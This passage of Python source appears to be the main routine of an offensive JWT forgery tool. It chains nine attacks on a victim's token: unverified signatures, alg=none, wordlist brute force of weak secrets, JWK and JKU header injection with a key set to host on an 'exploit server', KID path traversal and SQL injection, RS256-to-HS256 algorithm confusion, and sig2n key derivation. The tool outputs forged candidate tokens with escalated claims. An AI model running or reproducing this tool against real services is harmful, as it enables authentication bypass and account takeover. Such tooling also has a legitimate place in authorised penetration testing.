    print(col(f"    payload : {json.dumps(payload)}", C.DIM))

    print(col(f"    target  : {args.claim} → {args.value!r}\n", C.DIM))

    cast_value = args.value  # always a plain string — no type coercion

    all_results: List[Tuple[str, str, str]] = []

    def section(label: str):
        print(col(f"\n[*] {label}", C.BLU))

    # ── 1. No Verification (PATH1) ─────────────────────────────
    section("Attack 1 — No signature verification  (PATH1)")
    all_results += attack_no_verify(header, payload, args.claim, cast_value, orig_sig)

    # ── 2. alg=none (PATH2) ────────────────────────────────────
    if not args.skip_none:
        section("Attack 2 — Algorithm none variants  (PATH2)")
        all_results += attack_alg_none(header, payload, args.claim, cast_value)
    else:
        print(col("\n[*] Attack 2 — Skipped (--skip-none)", C.DIM))

    # ── 3. Weak Secret (PATH3) — prompts if no --wordlist ──────
    section("Attack 3 — Weak secret brute-force  (PATH3)")
    wordlist = args.wordlist
    if not wordlist:
        wordlist = input(col(
            "    [?] Path to wordlist (e.g. jwt.secrets.list, rockyou.txt) — Enter to skip: ",
            C.YLW
        )).strip()
    if wordlist:
        all_results += attack_weak_secret(
            args.jwt, header, payload, args.claim, cast_value, wordlist
        )
    else:
        print(col("    [-] Skipped.", C.DIM))

    # ── 4. JWK Injection (PATH4) ───────────────────────────────
    section("Attack 4 — JWK header injection  (PATH4)")
    all_results += attack_jwk_inject(header, payload, args.claim, cast_value)

    # ── 5. JKU Injection (PATH5) — always prints JWKS JSON ─────
    section("Attack 5 — JKU header injection  (PATH5)")
    if CRYPTO_AVAILABLE:
        priv, pub, kid, jwks_json = prepare_jku_keypair()

        # FIX: JWKS JSON now always printed — previously when --jku-url was
        # passed via CLI the JSON was never shown, so the user had nothing to host.
        print(col(f"\n  ┌─ HOST THIS JSON ON YOUR EXPLOIT SERVER ──────────────────", C.YLW, C.BOLD))
        for line in jwks_json.splitlines():
            print(col(f"  │ {line}", C.YLW))
        print(col("  └──────────────────────────────────────────────────────────", C.YLW))
        # FIX: also print a clean block without '│' prefix so it can be copy-pasted directly
        print(col("\n  ── Clean copy (no prefix chars) ───────────────────────────", C.DIM))
        print(jwks_json)
        print(col("  ───────────────────────────────────────────────────────────\n", C.DIM))

        jku_url = args.jku_url
        if not jku_url:
            jku_url = input(col(
                "    [?] URL where you hosted the JSON above (Enter to skip): ",
                C.YLW
            )).strip()

        if jku_url:
            all_results += attack_jku_inject(
                header, payload, args.claim, cast_value, jku_url, priv, kid
            )
        else:
            print(col("    [-] Skipped.", C.DIM))
    else:
        print(col("    [!] Skipped — pip install cryptography", C.YLW))

    # ── 6. KID Traversal (PATH6) ───────────────────────────────
    if not args.skip_kid:
        section("Attack 6 — KID path traversal → /dev/null  (PATH6)")
        all_results += attack_kid_traversal(header, payload, args.claim, cast_value)
    else:
        print(col("\n[*] Attack 6 — Skipped (--skip-kid)", C.DIM))

    # ── 7. KID SQLi ────────────────────────────────────────────
    if not args.skip_sqli:
        section("Attack 7 — KID SQL injection")
        all_results += attack_kid_sqli(header, payload, args.claim, cast_value)
    else:
        print(col("\n[*] Attack 7 — Skipped (--skip-sqli)", C.DIM))

    # ── 8. Algorithm Confusion (PATH7) — prompts if nothing given
    section("Attack 8 — Algorithm confusion RS256→HS256  (PATH7)")
    if CRYPTO_AVAILABLE:
        jwks_data: Optional[dict] = None

        # Priority: --base-url (probe) > --jwks-url (direct) > --public-key (PEM)
        if args.base_url:
            print(col(f"    Probing {args.base_url} for JWKS …", C.DIM))
            jwks_data = discover_jwks(args.base_url)
            if not jwks_data:
                print(col(f"    [-] No JWKS found at common endpoints on {args.base_url}", C.YLW))

        if not jwks_data and args.jwks_url:
            print(col(f"    Fetching JWKS from {args.jwks_url} …", C.DIM))
            jwks_data = fetch_jwks_from_url(args.jwks_url)
            if not jwks_data:
                print(col(f"    [-] Could not fetch/parse JWKS from {args.jwks_url}", C.YLW))

        if not jwks_data and args.public_key:
            all_results += attack_algo_confusion_from_pem(
                header, payload, args.claim, cast_value, args.public_key
            )

        # Interactive fallback when nothing was provided via CLI
        if not jwks_data and not args.public_key and not args.base_url and not args.jwks_url:
            choice = input(col(
                "    [?] Target JWKS URL / base URL / local .pem path (Enter to skip): ",
                C.YLW
            )).strip()
            if choice.startswith('http'):
                
                if _is_full_jwks_url(choice):
                    print(col(f"    Fetching JWKS from {choice} …", C.DIM))
                    jwks_data = fetch_jwks_from_url(choice)
                    if not jwks_data:
                        print(col(
                            "    [-] Could not fetch JWKS. Possible causes:\n"
                            "        • Self-signed cert (SSL retry was attempted above)\n"
                            "        • URL requires auth headers\n"
                            "        • Response was not JSON with a 'keys' field",
                            C.YLW
                        ))
                else:
                    print(col(f"    Probing {choice} for JWKS at common endpoints …", C.DIM))
                    jwks_data = discover_jwks(choice)
                    if not jwks_data:
                        print(col(f"    [-] No JWKS found at common endpoints on {choice}", C.YLW))
            elif choice:
                all_results += attack_algo_confusion_from_pem(
                    header, payload, args.claim, cast_value, choice
                )

        if jwks_data:
            all_results += attack_algo_confusion_from_jwks(
                header, payload, args.claim, cast_value, jwks_data
            )
    else:
        print(col("    [!] Skipped — pip install cryptography", C.YLW))

    # ── 9. sig2n (PATH8) — prompts for second JWT ──────────────
    section("Attack 9 — sig2n key derivation from two JWTs  (PATH8)")
    token2 = args.token2
    if not token2:
        token2 = input(col(
            "    [?] Second JWT from same server for sig2n\n"
            "        (log out → log in again → copy new cookie, or Enter to skip): ",
            C.YLW
        )).strip()
    if token2:
        all_results += attack_sig2n(
            header, payload, args.claim, cast_value, args.jwt, token2
        )
    else:
        print(col("    [-] Skipped.", C.DIM))

    # ── Results ────────────────────────────────────────────────
    print_results(all_results, args.target_url, args.header, bearer)

    if args.output:
        save_results(all_results, args.output, args.labeled)

    print(col(f"[+] Done — {len(all_results)} candidate JWTs generated.\n", C.GRN, C.BOLD))


if __name__ == '__main__':
    main()
